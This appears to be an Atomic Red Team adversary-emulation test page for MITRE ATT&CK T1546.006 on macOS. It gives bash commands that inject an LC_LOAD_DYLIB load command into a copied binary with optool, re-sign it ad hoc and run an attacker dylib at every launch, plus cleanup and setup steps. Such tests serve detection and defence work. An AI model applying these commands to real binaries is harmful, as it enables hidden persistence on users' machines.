# T1546.006 - Event Triggered Execution: LC_LOAD_DYLIB Addition

## Description from ATT&CK

> Adversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries. Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long as adjustments are made to the rest of the fields and dependencies.(Citation: Writing Bad Malware for OSX) There are tools available to perform these changes.
> 
> Adversaries may modify Mach-O binary headers to load and execute malicious dylibs every time the binary is executed. Although any changes will invalidate digital signatures on binaries because the binary is being modified, this can be remediated by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn’t checked at load time.(Citation: Malware Persistence on OS X)

[Source](https://attack.mitre.org/techniques/T1546/006)

## Atomic Tests

- [Atomic Test #1: Add LC_LOAD_DYLIB Load Command to a Mach-O Binary with optool](#atomic-test-1-add-lc_load_dylib-load-command-to-a-mach-o-binary-with-optool)

### Atomic Test #1: Add LC_LOAD_DYLIB Load Command to a Mach-O Binary with optool

Patches a copy of a benign Mach-O binary to add a new `LC_LOAD_DYLIB` load command pointing at an
adversary-controlled dylib, using the open-source `optool` utility, then ad-hoc re-signs the
patched binary since the patch invalidates its original signature. Every subsequent time the
patched binary is executed, the attacker's dylib is loaded and its constructor runs automatically,
persisting execution without needing to touch the original binary's code. This is the technique
and tooling referenced directly in the ATT&CK description for this sub-technique.

NOTE: this test only patches a copy of a non-system binary in /tmp; it never modifies a real
system binary, which would additionally be blocked by System Integrity Protection (SIP).

Reference: https://github.com/alexzielenski/optool

**Supported Platforms:** macOS

**auto_generated_guid:** `d23c4496-dff6-4014-a7ff-f5c7e86e4aee`

#### Inputs

| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| target_binary | Copy of a benign binary that will have the malicious LC_LOAD_DYLIB command added. | path | /tmp/T1546.006_target|
| dylib_source | Source for the malicious dylib to be loaded by the patched binary. | path | PathToAtomicsFolder/T1546.006/src/MacOS/T1546.006.c|
| malicious_dylib | Path to the compiled malicious dylib. | path | /tmp/T1546.006_payload.dylib|

#### Attack Commands: Run with `bash`!

```bash
cp #{target_binary} #{target_binary}.bak
optool install -c load -p "#{malicious_dylib}" -t #{target_binary}
codesign --sign - --force #{target_binary}
#{target_binary} test
cat /tmp/T1546.006_dylib_loaded.txt
```

#### Cleanup Commands

```bash
mv -f #{target_binary}.bak #{target_binary}
rm -f #{malicious_dylib} /tmp/T1546.006_dylib_loaded.txt
```

#### Dependencies: Run with `bash`!

##### Description: optool must be installed, and a copy of a benign binary plus the compiled malicious dylib must exist

###### Check Prereq Commands

```bash
if command -v optool >/dev/null 2>&1 && [ -f #{target_binary} ] && [ -f #{malicious_dylib} ]; then exit 0; else exit 1; fi
```

###### Get Prereq Commands

```bash
(command -v optool >/dev/null 2>&1) || (command -v brew >/dev/null 2>&1 && brew install optool) || (git clone --recursive https://github.com/alexzielenski/optool.git /tmp/optool_src && cd /tmp/optool_src && xcodebuild -project optool.xcodeproj -configuration Release SYMROOT=build && cp build/Release/optool /usr/local/bin/optool)
cp /bin/echo #{target_binary}
chmod +x #{target_binary}
gcc -dynamiclib #{dylib_source} -o #{malicious_dylib}
```
